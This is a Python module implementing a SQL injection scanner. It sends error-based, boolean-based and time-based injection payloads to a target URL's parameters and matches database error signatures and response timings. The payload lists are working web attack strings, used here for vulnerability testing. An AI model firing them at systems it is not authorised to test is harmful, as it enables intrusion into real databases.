"""
SQL Injection Scanner Module
Advanced SQL injection detection with multiple techniques
"""

import requests
import urllib.parse
from typing import List, Dict, Any
import re
import time
import logging

logger = logging.getLogger(__name__)


class SQLInjectionScanner:
    """
    Advanced SQL Injection vulnerability scanner
    Tests for error-based, boolean-based, time-based, and union-based SQL injection
    """
    
    # SQL injection payloads for different database types
    ERROR_BASED_PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin' OR '1'='1",
        "admin' OR '1'='1'--",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR 'a'='a",
        "') OR ('a'='a",
        "1' AND '1'='2",
        "' UNION SELECT NULL--",
        "' AND 1=CONVERT(int,(SELECT @@version))--"
    ]
    
    BOOLEAN_BASED_PAYLOADS = [
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1 AND 1=1",
        "1 AND 1=2"
    ]
    
    TIME_BASED_PAYLOADS = [
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; pg_sleep(5)--"
    ]
    
    # Error signatures for different databases
    ERROR_SIGNATURES = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"(\W|\A)SQL Server.*Driver",
        r"Warning.*mssql_.*",
        r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
        r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
        r"(?s)Exception.*\WRoadhouse\.Cms\.",
        r"Microsoft OLE DB Provider for ODBC Drivers error",
        r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_.*",
        r"Warning.*\Wora_.*"
    ]
    
    def __init__(self, timeout: int = 10):
        """
        Initialize SQL Injection Scanner
        
        Args:
            timeout: Request timeout in seconds
        """
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def scan_url(self, url: str, params: Dict[str, str] = None, method: str = "GET") -> List[Dict[str, Any]]:
        """
        Scan a URL for SQL injection vulnerabilities
        
        Args:
            url: Target URL
            params: URL parameters or POST data
            method: HTTP method (GET or POST)
            
        Returns:
            List of detected vulnerabilities
        """
        vulnerabilities = []
        
        if not params:
            # Extract parameters from URL
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        if not params:
            logger.warning(f"No parameters found for {url}")
            return vulnerabilities
        
        logger.info(f"Testing SQL injection on {url} with {len(params)} parameters")
        
        # Test each parameter
        for param_name in params.keys():
            logger.info(f"Testing parameter: {param_name}")
            
            # Error-based SQL injection
            vulns = self._test_error_based(url, params, param_name, method)
            vulnerabilities.extend(vulns)
            
            # Boolean-based SQL injection
            vulns = self._test_boolean_based(url, params, param_name, method)
            vulnerabilities.extend(vulns)
            
            # Time-based SQL injection
            vulns = self._test_time_based(url, params, param_name, method)
            vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    def _test_error_based(self, url: str, params: Dict, param_name: str, method: str) -> List[Dict[str, Any]]:
        """Test for error-based SQL injection"""
        vulnerabilities = []
        
        for payload in self.ERROR_BASED_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                if method.upper() == "POST":
                    response = self.session.post(url, data=test_params, timeout=self.timeout, verify=False)
                else:
                    response = self.session.get(url, params=test_params, timeout=self.timeout, verify=False)
                
                # Check for SQL error signatures
                for signature in self.ERROR_SIGNATURES:
                    if re.search(signature, response.text, re.IGNORECASE):
                        vulnerabilities.append({
                            'type': 'SQL Injection (Error-Based)',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'method': method,
                            'evidence': self._extract_evidence(response.text, signature),
                            'status_code': response.status_code,
                            'response_snippet': response.text[:500]
                        })
                        logger.warning(f"✗ SQL Injection detected in {param_name} with payload: {payload}")
                        break
                
            except Exception as e:
                logger.debug(f"Error testing payload {payload}: {e}")
            
            time.sleep(0.2)  # Rate limiting
        
        return vulnerabilities
    
    def _test_boolean_based(self, url: str, params: Dict, param_name: str, method: str) -> List[Dict[str, Any]]:
        """Test for boolean-based SQL injection"""
        vulnerabilities = []
        
        # Get baseline response
        try:
            if method.upper() == "POST":
                baseline = self.session.post(url, data=params, timeout=self.timeout, verify=False)
            else:
                baseline = self.session.get(url, params=params, timeout=self.timeout, verify=False)
            
            baseline_length = len(baseline.text)
            
            # Test true condition
            test_params_true = params.copy()
            test_params_true[param_name] = "1' AND '1'='1"
            
            if method.upper() == "POST":
                response_true = self.session.post(url, data=test_params_true, timeout=self.timeout, verify=False)
            else:
                response_true = self.session.get(url, params=test_params_true, timeout=self.timeout, verify=False)
            
            # Test false condition
            test_params_false = params.copy()
            test_params_false[param_name] = "1' AND '1'='2"
            
            if method.upper() == "POST":
                response_false = self.session.post(url, data=test_params_false, timeout=self.timeout, verify=False)
            else:
                response_false = self.session.get(url, params=test_params_false, timeout=self.timeout, verify=False)
            
            # Analyze responses
            true_length = len(response_true.text)
            false_length = len(response_false.text)
            
            # If true condition matches baseline and false differs significantly
            if abs(true_length - baseline_length) < 100 and abs(false_length - baseline_length) > 100:
                vulnerabilities.append({
                    'type': 'SQL Injection (Boolean-Based)',
                    'url': url,
                    'parameter': param_name,
                    'payload': "1' AND '1'='1 / 1' AND '1'='2",
                    'method': method,
                    'evidence': f"Response length difference: True={true_length}, False={false_length}",
                    'status_code': response_true.status_code,
                    'response_snippet': response_true.text[:500]
                })
                logger.warning(f"✗ Boolean-based SQL Injection detected in {param_name}")
        
        except Exception as e:
            logger.debug(f"Error in boolean-based test: {e}")
        
        return vulnerabilities
    
    def _test_time_based(self, url: str, params: Dict, param_name: str, method: str) -> List[Dict[str, Any]]:
        """Test for time-based blind SQL injection"""
        vulnerabilities = []
        
        for payload in self.TIME_BASED_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload
            
            try:
                start_time = time.time()
                
                if method.upper() == "POST":
                    response = self.session.post(url, data=test_params, timeout=15, verify=False)
                else:
                    response = self.session.get(url, params=test_params, timeout=15, verify=False)
                
                elapsed = time.time() - start_time
                
                # If response took significantly longer (4+ seconds), likely vulnerable
                if elapsed > 4:
                    vulnerabilities.append({
                        'type': 'SQL Injection (Time-Based Blind)',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'method': method,
                        'evidence': f"Response time: {elapsed:.2f} seconds",
                        'status_code': response.status_code,
                        'response_snippet': response.text[:500]
                    })
                    logger.warning(f"✗ Time-based SQL Injection detected in {param_name}")
                    break
            
            except requests.exceptions.Timeout:
                logger.info(f"Timeout occurred - possible time-based SQLi in {param_name}")
            except Exception as e:
                logger.debug(f"Error testing time-based payload: {e}")
        
        return vulnerabilities
    
    def _extract_evidence(self, response_text: str, pattern: str) -> str:
        """Extract evidence of SQL error from response"""
        match = re.search(pattern, response_text, re.IGNORECASE)
        if match:
            start = max(0, match.start() - 50)
            end = min(len(response_text), match.end() + 50)
            return response_text[start:end]
        return "SQL error detected"


# Example usage
if __name__ == "__main__":
    scanner = SQLInjectionScanner()
    
    # Test URL
    test_url = "https://example.com/search"
    test_params = {"q": "test", "id": "1"}
    
    vulnerabilities = scanner.scan_url(test_url, test_params)
    
    print(f"\nFound {len(vulnerabilities)} SQL injection vulnerabilities:")
    for vuln in vulnerabilities:
        print(f"  - {vuln['type']} in parameter '{vuln['parameter']}'")
